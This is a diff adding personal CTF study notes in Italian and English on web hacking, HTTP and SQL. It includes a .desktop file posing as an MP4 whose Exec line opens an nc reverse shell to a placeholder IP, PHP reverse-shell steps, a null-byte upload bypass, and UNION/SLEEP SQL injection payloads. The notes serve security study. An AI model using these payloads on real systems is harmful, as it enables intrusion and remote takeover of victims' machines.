@@ -1,0 +1,177 @@
+## WEB
+- `curl sito | grep flag` provarlo sempre, potrebbe funzionare...
+- Se non trovi la risposta e hai delle richieste HTTP prova a **cambiare** il *metodo*
+- Se il **check** è via **js** scarica tutta la pagina e la modifichi in locale come vuoi ( *se non riesci a modificarla live sul broser* )
+- **Se non trovi la risposta fai generare errori a php**
+- **`.DS_Store`**: is a common file in some websites, I think only in Apache servers, it is connected with MAC and Storage
+
+- **Insecure direct object reference (IDOR) vulnerability** arises when attackers can access or modify objects by manipulating identifiers used in a web application's URLs or parameters. It occurs due to missing access control checks, which fail to verify whether a user should be allowed to access specific data. (`http://notes.challs.olicyber.it/account/account_number_that_you_want`)
+
+- **`.htaccess`**: is a common file in a lots of websites, I think only in Apache servers
+
+- **[Null Byte Injection](https://youtu.be/jBtzFGwHvxE)** (*upload dei file*): a technique for sending data that would be filtered otherwise. It relies on injecting the null byte characters (%00, \x00) in the supplied data. Its role is to terminate a string.
+   
+   Se non funziona ci sono dei video:
+  - [Web Application Hacking - File Upload Attacks Explained](https://youtu.be/YAFVGQ-lBoM)
+  - [How To Bypass Website File Upload Restrictions](https://youtu.be/xZd1JWmLGLk)
+  - [File Upload Vulnerabilities & Filter Bypass](https://youtu.be/ZWG1nNdUnBc)
+
+  Una volta caricato il file che vuoi puoi provare una [*reverse-shell*](#reverse-shell)
+
+  ###### Example 1
+  1. An attacker wants to retrieve the file `/etc/passwd` but an extension `.php` is appended automatically such as `/etc/passwd.php`.
+  2. The attacker uses the null byte to terminate the string and throw away the `.php` extension: `/etc/passwd%00`
+   
+    ###### Example 2
+     1. An attacker wants to upload a `malicious.php`, but the only extension allowed is `.pdf`.
+     2. The attacker constructs the file name such as `malicious.php%00.pdf` and uploads the file.
+     3. The application reads the `.pdf` extension, validate the upload, and later throws the end of the string due to the null byte.
+     4. The file `malicious.php` is then put in the server.
+
+- **Redirect Links**
+Add `+` at the end of the URL to see the site where the redirect links will bring you: `https://tinyurl.com/bw7t8p4u+`
+
+- **`robots.txt`**
+Sometimes the websites contain a robots.txt file, it can be usefull for example for the SEO, in particular we could don't want to indexing our web sites.
+
+- Sessioni
+Il cookie sessione è in base 64, decodificarlo e vedere come è scritto, non sempre è possibile copiarlo ed essere loggati, però in alcuni casi si. Per defifrarlo basta usare [CyberChef](https://cyberchef.org/)
+
+- Prova sempre a loggarti come **admin**
+
+- Cambiare `IP` di provenienza: è un *header*, tipicamente `X-Forwarded-For` o `Forwarded`
+
+### Comandi e strumenti
+- Gobuster
+- [nikto](#nikto)
+- [rustscan](#rustscan)
+- [smbclient](#smbclient)
+
+Modificare ed effettuare richieste particolari:
+- postman
+- Requests *python library* (file `web.py`)
+- burp suite
+
+### HTTP 
+#### CODE
+- 100 - 199 (Information)
+- 200 - 299 (Successful)
+- 300 - 399 (Redirection)
+- 400 - 499 (Client error)
+- 500 - 599 (Server error)
+
+#### HEADER
+- GET: richiede al server una risorsa, possono essere specificati alcuni parametri attraverso la coppia: chiave=valore&chiave1=valore1
+- HEAD: richiede solo l'header, tipicamente utilizzato in fase di testing
+- POST: invia informazioni all'indirizzo indicato, esse sono inserite nel body della richiesta
+- PUT: esegue l'upload di un file su server
+- DELETE: cancella una risorsa
+- OPTIONS: richiede al server l'elenco dei metodi concessi
+- TRACE: traccia una richiesta
+
+### URN URI URL
+L'Uniform Resource Identifier, URI, è una stringa che identifica univocamente una risorsa; l'Uniform Resource Locator è una specifica dell'URI che comprende, oltre al percorso che identifica la risorsa, viene aggiunto il protocollo usato per accendervi, comunemente il termine URL viene usato impropriamente per riferirsi ad ogni tipo di URI.
+
+In addizione a URI e URL esiste anche l'Uniform Resource Name, URN, il quale è anch'esso un sottoinsieme dell'URI, ma a differenza dell'URL indica solo il percorso della risorsa.
+
+Le risorse vengono identificate con un URI, se esso indica anche il protocollo con cui accedere alla risorsa è un URL, altrimenti è un URN.
+
+- **URL** `https://www.tiadeca.com/blog-page.php`
+- **URN** `tiadeca.com/blog-page.php`
+
+### Reverse Shell
+Aprire una reverse shell significa poter eseguire comandi sulla macchina vittima e avere quindi un possibile controllo equivalente al 100%, il tutto dipende dai privilegi che si riesce ad ottenere attraverso le tattiche di [[Post-exploitation]] o in base alla o alle vulnerabilità sfruttate, individuate grazie ai metoditi di [[Reconnaissance]], sia [[Active Reconnaissance]] che [[Passive Reconnaissance]].
+
+#### Reverse shell with an mp4 file (only in linux mint?)
+> whatch [this](https://youtu.be/ZlfloTpLGT0?list=PL0fOAKA0mBdspB0x8BhMegc0ZoEwQpq32) video or read [this](https://null-byte.wonderhowto.com/how-to/pop-reverse-shell-with-video-file-by-exploiting-popular-linux-file-managers-0196078/) article
+
+1. Create a file named `name.desktop`
+2. write in there these lines:
+   ```
+        [Desktop Entry]
+        Encoding=UTF-8
+        Name=fake_video.mp4
+        Exec=/usr/bin/wget 'http://192.168.1.XX/real_video.mp4' -O /tmp/real_video.mp4; /usr/bin/xdg-open /tmp/real_video.mp4; /usr/bin/mkfifo /tmp/f; /bin/nc 192.168.1.XX 1234 < /tmp/f | /bin/bash -i > /tmp/f 2>&1 &
+        Terminal=false
+        Type=Application
+        Icon=video-x-generic
+   ```
+3. change the first ip addr with **your local server** ip addr
+4. change the second ip addr with **your local server** ip addr
+
+### Reverse shell php
+1. Download the file [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+
+2. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to [ilmioip](https://www.mio-ip.it/) in the browser of your device). 
+
+3. We're now going to listen to incoming connections using netcat. Run the following command: `nc -lvnp 1234`
+
+4. Search the page to load and execute your payload
+
+> As you can see you will open a local server on your computer on port 1234, from here, using ncat you will interact with the target host shell
+
+> Per mettere online il server locale ci si può appoggiare ad ngrok
+
+## SQL
+Query exercises [here](https://www.sql-practice.com/)
+### BETWEEN
+Il primo dato deve essere il limite inferiore, il secondo il superiore, non viceversa.
+
+> I limiti sono compresi: <br>
+> ` BETWEEN 4 AND 10 ` comprende sia 4 che 10
+### IN
+Al posto di usare molteplici ` OR ` uso un ` IN `; esso mi consente di cercare un valore in una lista di valori.
+
+```sql
+    SELECT ... WHERE name IN ('Sara','Vanessa','Marta','Giulia')
+```
+
+> Oltre al costrutto ` IN ` esiste anche il ` NOT IN `
+### CONCAT
+Permette di concatenare più stringhe
+```sql
+    SELECT CONCAT(FirstName, ', ' , City) FROM customers;
+```
+### UPPER and LOWER
+The **UPPER** function converts all letters in the specified string to uppercase.
+The **LOWER** function converts the string to lowercase.
+
+```sql
+    SELECT FirstName, UPPER(LastName) AS LastName FROM employees;
+```
+### UNION
+`UNION` in SQL concat two or more `SELECT`, without the `ALL` keyword it consider all values once, so the duplicate will be delete.
+
+> All the select in a UNION must have the same number of column
+
+```sql
+    SELECT ID, FirstName, LastName, City FROM First
+    UNION ALL
+    SELECT ID, FirstName, LastName, City FROM Second;
+```
+### SQL Injection
+- database() return the name of the database
+
+```sql
+    UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+```
+Una volta trovato il nome del database posso cercare tutte le tabelle che appartengono a questo database
+*There are a couple of new things to learn in this query. Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users.*
+
+```sql
+    UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+```
+
+```sql
+    https://website.thm/analytics?referrer=referrer=admin123' UNION SELECT SLEEP(2),2 where database() like 'sqli_four';--
+    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'u%';--
+
+    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+
+    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
+
+    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+
+    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+    username
+```
